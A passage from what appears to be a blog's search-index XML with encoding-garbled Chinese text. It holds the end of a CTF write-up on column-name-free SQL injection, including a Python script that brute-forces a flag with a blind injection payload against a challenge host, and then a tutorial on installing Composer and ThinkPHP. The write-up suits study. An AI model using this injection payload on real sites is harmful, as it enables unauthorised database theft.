class="line">| (select &#x27;fl&#x27;) &gt; (select &#x27;flag&#x27;) |</span><br><span class="line">+---------------------------------+</span><br><span class="line">|                               0 |</span><br><span class="line">+---------------------------------+</span><br></pre></td></tr></table></figure><p>å› ä¸ºåœ¨<strong>ç›¸ç­‰</strong>æ—¶è¿”å›<strong>0</strong>ï¼Œæ‰€ä»¥åœ¨è¿›è¡Œçˆ†ç ´æ—¶ï¼Œæˆ‘ä»¬çˆ†ç ´å‡ºæ¥çš„<strong>1</strong>çš„æ—¶å€™ï¼Œæ˜¯æ¯”æ­£ç¡®å­—ç¬¦è¦<strong>å¤§1</strong>çš„ï¼Œæ‰€ä»¥åœ¨ç¼–å†™è„šæœ¬æ—¶ï¼Œæˆ‘ä»¬è¦**-1**æ‰èƒ½å¾—åˆ°æ­£ç¡®å­—ç¬¦ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åœ¨è®¾ç½®å¾ªç¯ä¸Šé™æ—¶asciiå€¼è¦å¤§äºæˆ–è€…ç­‰äº<strong>127</strong></p><p><img src="https://img-blog.csdnimg.cn/010a3d165be443bebe8e9c49885e9f2d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è„šæœ¬å¦‚ä¸‹ï¼š([GYCTF2020]Ezsqli)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://e0e4d9bf-1f0b-435c-aedf-6d1aa33856ce.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        hexchar=flag+<span class="built_in">chr</span>(j)</span><br><span class="line">        payload = <span class="string">&#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data=&#123;<span class="string">&#x27;id&#x27;</span>:payload&#125;</span><br><span class="line">        re=requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ä¸€äº›å§¿åŠ¿æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ— åˆ—åæ³¨å…¥ </tag>
            
            <tag> å§¿åŠ¿æ€»ç»“ </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowsä¸‹phpstudyå®‰è£…composeråŠå…¶thinkphpå„ç‰ˆæœ¬</title>
      <link href="/2021/11/26/Windows%E4%B8%8Bphpstudy%E5%AE%89%E8%A3%85composer%E5%8F%8A%E5%85%B6thinkphp%E5%90%84%E7%89%88%E6%9C%AC/"/>
      <url>/2021/11/26/Windows%E4%B8%8Bphpstudy%E5%AE%89%E8%A3%85composer%E5%8F%8A%E5%85%B6thinkphp%E5%90%84%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>å­¦ä¹ thinphpï¼Œåœ¨æ­å»ºç¯å¢ƒæ˜¯é‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œæ•…æ­¤å†™ä¸‹ã€‚</p><h2 id="ç¼˜ç”±ï¼š"><a href="#ç¼˜ç”±ï¼š" class="headerlink" title="ç¼˜ç”±ï¼š"></a>ç¼˜ç”±ï¼š</h2><p>ç”±äºå®˜ç½‘ä¸Šthinkphpç‰ˆæœ¬åªæä¾›åˆ°5.0.24 ï¼Œè€Œéœ€è¦ä¸‹è½½çš„ç‰ˆæœ¬ä¸º5.1åŠå…¶ä»¥ä¸Šç‰ˆæœ¬</p><p><a href="https://imgse.com/i/pCfvQYR"><img src="https://s1.ax1x.com/2023/07/12/pCfvQYR.png" alt="pCfvQYR.png"></a></p><h2 id="ä¸€ã€composerçš„ä¸‹è½½å®‰è£…"><a href="#ä¸€ã€composerçš„ä¸‹è½½å®‰è£…" class="headerlink" title="ä¸€ã€composerçš„ä¸‹è½½å®‰è£…"></a>ä¸€ã€composerçš„ä¸‹è½½å®‰è£…</h2><p>æˆ‘ä»¬éœ€è¦åˆ©ç”¨<strong>composer</strong>æ¥å®‰è£…<strong>thinkphp</strong>é«˜ç‰ˆæœ¬</p><p><a href="https://imgse.com/i/pCfvlf1"><img src="https://s1.ax1x.com/2023/07/12/pCfvlf1.png" alt="pCfvlf1.png"></a></p><p>æ¥åˆ°phpstudy<strong>ç½‘ç«™</strong>ç•Œé¢ï¼Œç›´æ¥ç‚¹å‡»composerå³å¯ä¸‹è½½</p><p>ä¸‹è½½ä¹‹åï¼Œä½†æ˜¯æ³¨æ„ï¼Œè¿™é‡Œä¸‹è½½çš„æ˜¯<strong>1.8.5</strong>ç‰ˆæœ¬çš„composer</p><p><a href="https://imgse.com/i/pCfv8l6"><img src="https://s1.ax1x.com/2023/07/12/pCfv8l6.png" alt="pCfv8l6.png"></a></p><p>æ‰€ä»¥ä¸‹è½½å®Œä¹‹åï¼Œåˆ©ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å‡çº§composer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer selfupdate</span><br></pre></td></tr></table></figure><h2 id="äºŒã€åˆ©ç”¨composerå®‰è£…thinkphp"><a href="#äºŒã€åˆ©ç”¨composerå®‰è£…thinkphp" class="headerlink" title="äºŒã€åˆ©ç”¨composerå®‰è£…thinkphp"></a>äºŒã€åˆ©ç”¨composerå®‰è£…thinkphp</h2><p>æ‰“å¼€composerå®˜ç½‘ï¼š<a href="https://www.phpcomposer.com/">Composer ä¸­æ–‡ç½‘</a>ï¼Œç‚¹å‡»<a href="https://packagist.org/">Packagist è‹±æ–‡å®˜ç½‘</a>ï¼Œæ‰¾åˆ°ä½ è¦ä¸‹è½½çš„ç‰ˆæœ¬</p><p><img src="https://img-blog.csdnimg.cn/5277d1b7e7a5429c975382022f8a0c32.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_12,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¤åˆ¶ä»¥ä¸‹å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/ccf6dc84a19a4431b2ad8ca330872edc.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åœ¨å‘½ä»¤è¡Œä¸­é”®å…¥ä»¥ä¸‹å‘½ä»¤å³å¯å®‰è£…æˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=(è¾“å…¥ä½ æƒ³è¦ä¸‹è½½çš„ç‰ˆæœ¬) tp5.1(æ–‡ä»¶å¤¹çš„åç§°)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a1948438363645a7ab952b5e218dffd3.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_18,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æˆåŠŸåä¼šåœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶å¤¹tp5.1</p><p><img src="https://img-blog.csdnimg.cn/bc13502962ee4d1e90aabed03580724c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¹‹åè®¿é—®ä¾¿å¯</p><p><img src="https://img-blog.csdnimg.cn/6031cfab5f404e48a2db35c1e6258760.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶å®‰è£…åŠç¯å¢ƒæ­å»º </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è½¯ä»¶å®‰è£… </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
